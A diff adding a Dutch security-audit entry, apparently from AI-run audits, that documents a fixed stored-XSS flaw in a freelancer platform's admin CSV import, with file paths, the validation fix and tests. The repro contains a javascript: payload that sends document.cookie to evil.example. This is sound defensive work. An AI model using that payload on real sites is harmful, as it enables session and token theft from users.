@@ -4,6 +4,51 @@
 > geparkeerd met repro, severity (KRITIEK/HOOG/MIDDEL/LAAG), geschonden regel en aanbevolen fix.
 > Pak per run de 1–3 belangrijkste; werk dit bestand bij.
 
+## Ronde 2026-08-14 (basis: `main` @ d5ea18dd) — 1× HOOG opgelost (stored XSS in bulk-import)
+
+Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
+(1: alle server actions + `/api`-route-handlers → auth→rol→ownership→Zod→actie→audit + IDOR + cross-tenant
+
+- mass-assignment; 2: privacy/AVG — erasure↔export-symmetrie, dataminimalisatie, k-anonimiteit, PII-in-logs,
+  retentie; 3: injectie (SQL/XSS/CSV/ICS/SSRF) + upload/storage + secrets + headers/CSP + foutafhandeling +
+  open redirect + `npm audit`), plus onafhankelijke orchestrator-probes (deel-token/`/vertrouwen`,
+  password-reset, `/api/metrics`-autorisatie, public-route-allowlist) en een schone build (`npm run build`
+  groen). Delta sinds de vorige ronde: `0cec5281..d5ea18dd` (#1081 DUO/BIG/iDIN HTTP-retry/-timeout hardening
+  — geverifieerd schoon: env-only base-URLs (geen SSRF), geen PII in foutmeldingen; #1082 de vorige auditdoc).
+
+### OPGELOST — Stored XSS via ongevalideerd `website`-veld in admin CSV-bulk-import (HOOG · OWASP A03 / CWE-79)
+
+**Geschonden regel:** Architectuurregel 1 (server-side is de waarheid — Zod-validatie op elke mutatie) +
+regel 2 (auth→rol→ownership→**Zod**→actie→audit). De admin-bulk-import omzeilde de canonieke `httpUrl()`-guard.
+
+**Repro (vóór de fix):** Een ADMIN importeert via `/admin/import` een CSV (bv. een klantenlijst van een
+bemiddelaar/partner die de admin niet zelf schreef — de vertrouwensgrens is de herkomst van het bestand, niet
+"een admin typte het") met een rij `rol=opdrachtgever;bedrijfsnaam=Test BV;website=javascript:fetch('https://evil.example/?c='+document.cookie)`.
+`buildImportPreview`/`commitImport` accepteerden de waarde ongewijzigd (`website: get(rec,"website") || null`,
+`src/lib/onboarding/import.ts:258`; write `website: row.website ?? undefined`,
+`src/app/(protected)/admin/import/actions.ts:253`) — géén schema-check. De waarde belandt rauw in
+`Company.website` en wordt als **ongefilterde `href`** gerenderd op het bedrijfsprofiel
+(`src/components/company/company-profile-screen.tsx:222`) én op elke opdracht van dat bedrijf
+(`src/app/(protected)/opdrachten/[id]/page.tsx:763`). React 19 blokkeert een `javascript:`-href niet in
+productie → klikken voert aanvaller-JS uit in de geauthenticeerde sessie van elke ZZP'er/opdrachtgever die de
+link opent (sessie-/tokendiefstal op een platform met VOG/diploma/ID-documenten). Cross-user impact.
+
+**Fix (dit PR):**
+
+- Parse-laag (de gedeelde bron van waarheid die zowel de preview als `commitImport` gebruikt): nieuwe
+  `parseWebsite()` in `src/lib/onboarding/import.ts` valideert via `httpUrl()` (weigert `javascript:`/`data:`
+  e.d.); ongeldige waarde → waarschuwing + waarde gedropt (rij blijft importeerbaar, net als een onleesbaar
+  uurtarief).
+- Defense-in-depth vlak vóór de write: `safeWebsite()` in `admin/import/actions.ts` her-valideert met
+  `httpUrl()` (net als `assertImportRole` naast het rol-veld), zodat een toekomstige refactor die ooit een
+  niet-geparste rij zou doorgeven niet kan regresseren.
+- Tests (rood→groen): `src/lib/onboarding/import.test.ts` — `javascript:`- en `data:`-website worden gedropt
+  met een `website`-warning, geldige `https://`-website blijft behouden.
+
+**Sweep:** de andere twee `href={…website}`-sinks (`profile.website`, `job.company.website`) worden
+uitsluitend gevoed door `freelancerProfileSchema`/`companyProfileSchema` (beide `httpUrl()`,
+`src/lib/validation.ts:174,189`) — de bulk-import was de énige bypass; de klasse is nu volledig gedicht.
+
 ## Ronde 2026-08-13b (basis: `main` @ 0cec5281) — geen nieuwe gaten
 
 Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
